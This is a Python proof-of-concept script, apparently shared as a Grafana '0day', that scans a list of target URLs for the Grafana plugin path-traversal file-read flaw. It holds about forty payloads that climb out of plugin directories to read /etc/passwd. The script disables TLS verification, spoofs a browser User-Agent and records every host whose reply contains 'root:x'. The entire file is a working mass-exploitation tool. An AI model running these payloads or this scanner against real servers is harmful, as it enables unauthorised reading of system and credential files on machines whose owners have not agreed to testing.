#!/usr/bin/env python
# --*-- coding:utf-8 --*--
# @Time       :2021/12/08 12:38
# @Author     :mik1th0n
# @File       :Grafana-0day-Vuln-POC.py

import urllib.request
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

vuln_url = []
pyload_lib = [
        '/public/plugins/grafana-clock-panel/../../../../../../../../etc/passwd',
        '/public/plugins/alertlist/../../../../../../../../etc/passwd',
        '/public/plugins/annolist/../../../../../../../../etc/passwd',
        '/public/plugins/barchart/../../../../../../../../etc/passwd',
        '/public/plugins/cloudwatch/../../../../../../../../etc/passwd',
        '/public/plugins/dashlist/../../../../../../../../etc/passwd',
        '/public/plugins/elasticsearch/../../../../../../../../etc/passwd',
        '/public/plugins/graph/../../../../../../../../etc/passwd',
        '/public/plugins/graphite/../../../../../../../../etc/passwd',
        '/public/plugins/heatmap/../../../../../../../../etc/passwd',
        '/public/plugins/influxdb/../../../../../../../../etc/passwd',
        '/public/plugins/mysql/../../../../../../../../etc/passwd',
        '/public/plugins/opentsdb/../../../../../../../../etc/passwd',
        '/public/plugins/pluginlist/../../../../../../../../etc/passwd',
        '/public/plugins/postgres/../../../../../../../../etc/passwd',
        '/public/plugins/prometheus/../../../../../../../../etc/passwd',
        '/public/plugins/stackdriver/../../../../../../../../etc/passwd',
        '/public/plugins/table/../../../../../../../../etc/passwd',
        '/public/plugins/text/../../../../../../../../etc/passwd',
        '/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd',
        '/public/plugins/bargauge/../../../../../../../../etc/passwd',
        '/public/plugins/gauge/../../../../../../../../etc/passwd',
        '/public/plugins/geomap/../../../../../../../../etc/passwd',
        '/public/plugins/gettingstarted/../../../../../../../../etc/passwd',
        '/public/plugins/histogram/../../../../../../../../etc/passwd',
        '/public/plugins/jaeger/../../../../../../../../etc/passwd',
        '/public/plugins/logs/../../../../../../../../etc/passwd',
        '/public/plugins/loki/../../../../../../../../etc/passwd',
        '/public/plugins/mssql/../../../../../../../../etc/passwd',
        '/public/plugins/news/../../../../../../../../etc/passwd',
        '/public/plugins/nodeGraph/../../../../../../../../etc/passwd',
        '/public/plugins/piechart/../../../../../../../../etc/passwd',
        '/public/plugins/stat/../../../../../../../../etc/passwd',
        '/public/plugins/state-timeline/../../../../../../../../etc/passwd',
        '/public/plugins/status-history/../../../../../../../../etc/passwd',
        '/public/plugins/table-old/../../../../../../../../etc/passwd',
        '/public/plugins/tempo/../../../../../../../../etc/passwd',
        '/public/plugins/testdata/../../../../../../../../etc/passwd',
        '/public/plugins/timeseries/../../../../../../../../etc/passwd',
        '/public/plugins/welcome/../../../../../../../../etc/passwd',
        '/public/plugins/zipkin/../../../../../../../../etc/passwd',
    ]

def grafana_vuln_poc(url):
    
    headers = {"User-Agent": "Mozilla/5.0 (X11; Gentoo; rv:82.1) Gecko/20100101 Firefox/82.1"}
    for pyload_data in pyload_lib:
        pyload = url + pyload_data
        request = urllib.request.Request(url=pyload, headers=headers)
        requests = urllib.request.urlopen(request, timeout=3)
        code = requests.getcode()
        context = requests.read()

        if "root:x" in context.decode('utf-8') and code == 200:
            print("*************************** 发现可利用的漏洞 ***************************")
            print("payload：" + pyload)
            print("返回值：" + context.decode('utf-8')[:32])
            vuln_url.append(url)

if __name__ == '__main__':

    with open("result-20211209001115.txt", "r", encoding="utf-8") as f:
        url_lib = f.readlines()
    for url_buf in url_lib:
        if url_buf.replace("\n", "").split("/")[0] == "http:" or url_buf.replace("\n", "").split("/")[0] == "https:":
            url = url_buf.replace("\n", "").split("/")[0] + "//" + url_buf.replace("\n", "").split("/")[2]
        else:
            url = "http://" + url_buf.replace("\n", "").split("/")[0]

        print("当前测试URL：" + url)
        try:
            grafana_vuln_poc(url)
        except Exception as e:
            print(e)

    print("有漏洞的URL如下：")
    print(set(vuln_url))
